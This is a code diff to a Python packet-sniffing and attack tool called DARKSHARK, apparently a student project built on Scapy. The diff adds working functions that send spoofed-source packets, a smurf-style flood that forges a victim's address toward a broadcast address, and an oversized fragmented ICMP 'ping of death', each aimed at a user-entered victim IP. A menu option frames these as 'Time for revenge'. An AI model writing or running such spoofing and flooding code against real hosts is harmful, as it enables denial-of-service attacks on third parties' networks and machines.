@@ -8,6 +8,7 @@ import os
 import glob
 import sys
 import re
+import ipaddress
 
 #class for new interface
 class newInterface:
@@ -71,6 +72,21 @@ def validate_filter(filter):
 	if stderr:return 0
 	else:return 1
 
+#Validation of input ip address
+def validate_ip(ip):
+	try:
+		ipaddress.ip_address(ip)
+		return True
+	except ValueError:
+		return False
+
+#Return a valid count for packets, either a positive input or default value
+def get_packetCount():
+	num = input("Please enter the number of packets to be sent. (default is 5)")
+	while int(num)<0 and num:
+		num = input("Please enter a valid count for packets! (Default is 5) ")
+	return int(num) if num else 5
+
 #print introduction
 def print_intro():
 	os.system('clear')
@@ -88,7 +104,7 @@ def print_intro():
 		print("-", end = "")
 	# print("\n\t\t\t\t\t__/\__ Welcome to the DARKSHARK (v1.0) __/\__")
 	print("\n\nGet ready to dive in the world of hacking with your new buddy DARKSHARK.")
-	print("Developed with \u2764 by the three comrades:")
+	print("Developed with \N{blue heart} by the three comrades:")
 	print("\t-> Parth Thakker")
 	print("\t-> Gaurav Bansal")
 	print("\t-> Manas Ghai")
@@ -111,7 +127,7 @@ def print_menu():
 	1. List available interfaces
 	2. List available BPFs
 	3. Start packet sniffing
-	4. Time for revenge(Launch Attacks)
+	4. Time for revenge(Launch Attacks) \N{smiling face with horns}
 	5. Exit'''
 	print(menu)
 
@@ -156,13 +172,7 @@ def capture_packets(filecounter):
 	global counter
 	counter = 1
 	#Get the packetnumber
-	packetNumber = 5
-	while True:
-		pn = input("Enter the number of packets to be sniffed (Default is 5): ")
-		if not pn or int(pn)>0:
-			break
-		elif int(pn)<=0: print("Please enter a positive number.")
-	packetNumber = int(pn) if pn else 5
+	packetNumber = get_packetCount()
 		
 	#Get the interface
 	interface = ""
@@ -228,11 +238,38 @@ def capture_packets(filecounter):
 	 
 	return filecounter
 
+#ip spoof attack
+def ip_spoofing():
+	print("\t\t IP Spoofing \N{ghost}")
+	print("-"*60)
+	
+	source_ip = input("Please enter the source IP address:")
+	while not validate_ip(source_ip):
+		source_ip = input("Invalid IP! Please enter a valid IP address")
+
+	dest_ip = input("Please enter the destination IP address:")
+	while not validate_ip(dest_ip):
+		dest_ip = input("Invalid IP! Please enter a valid IP address")
+
+	num_packets = get_packetCount()
+
+	send( IP(src = source_ip, dst =dest_ip)/TCP()/"Spoofing You rn :)" , count = num_packets )
+	print("\nIP Spoofing attack finished.")
+	print("-"*60)
+
 #ip smurf attack
 def ip_smurf_attack():
-	print("\t\t IP SMURF Attack")
+	print("\t\t IP SMURF Attack \N{cyclone}")
 	print("-"*60)
-	#remaining code
+	victim_ip = input("Please enter the victim's IP address:")
+	while not validate_ip(victim_ip):
+		victim_ip = input("Invalid IP! Please enter a valid IP address")
+
+	num_packets = get_packetCount()
+
+	send( IP(src = victim_ip, dst ='255.255.255.255')/TCP()/"Smurfing You rn :P" , count = num_packets )
+	print("\nIP Smurfing attack finished.")
+	print("-"*60)
 
 #dns reflection attack
 def dns_reflection_attack():
@@ -242,35 +279,35 @@ def dns_reflection_attack():
 	
 #dns amplification attack
 def dns_amplification_attack():
-	print("\t\t DNS Amplification Attack")
+	print("\t\t DNS Amplification Attack \N{bomb}")
 	print("-"*60)
 	#remaining code
 	
 #TCP SYN flooding attack
 def tcp_synflood_attack():
-	print("\t\t TCP SYN Flooding Attack")
-	print("-"*60)
-	#remaining code
-	
-#ip spoof attack
-def ip_spoofing():
-	print("\t\t IP Spoofing")
+	print("\t\t TCP SYN Flooding Attack \N{water wave}")
 	print("-"*60)
 	#remaining code
 	
 #ping of death attack
 def ping_of_death():
-	print("\t\t Ping of Death")
+	print("\t\t Ping of Death \N{skull}")
 	print("-"*60)
-	#remaining code
+	victim_ip = input("Please enter the victim's IP address:")
+	while not validate_ip(victim_ip):
+		victim_ip = input("Invalid IP! Please enter a valid IP address")
+
+	send( fragment(IP(dst=victim_ip)/ICMP()/("Very big payload"*60000)) )
+	print("\nPing of death attack concluded successfully.")
+	print("-"*60)
 
 #option 4 of menu: launch attacks
 def launch_attacks():
-	print("It's time to launch attacks! \u0471 \u03EA \u0471 (fire symbol).. Kick off by choosing one of the following:- ") #replace fire symbol with unicode
+	print("It's time to launch attacks \N{fire} Kick off by choosing one of the following:- ") #replace fire symbol with unicode
 	print("1. IP Smurf Attack")
-	print("2. DNS Reflection Attack")
-	print("3. DNS Amplification Attack")
-	print("4. TCP SYN Flooding Attack")
+	print("2. DNS Reflection Attack (Pending)")
+	print("3. DNS Amplification Attack (Pending)")
+	print("4. TCP SYN Flooding Attack (Pending)")
 	print("5. IP Spoofing")
 	print("6. Ping of Death")
 	print("7. Exit")
@@ -302,9 +339,7 @@ def launch_attacks():
 		os.system('clear')
 		ping_of_death()
 	else:
-		os.system('clear')
-		print("See you soon :)")
-		print("-"*20)
+		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time \N{shark}")
 
 #main function
 print_intro() #print introduction on console
@@ -342,11 +377,11 @@ while True:
 		os.system('clear')
 		launch_attacks()
 	else:
-		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time :)")
+		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time \N{shark}")
 			
 	#Prompt for staying in the program
 	to_continue = input("Do you want to stay? (y/n): ")
 	if to_continue is not ("y" or "Y"):
-		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time :)")
+		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time \N{shark}")
 
 	os.system('clear')
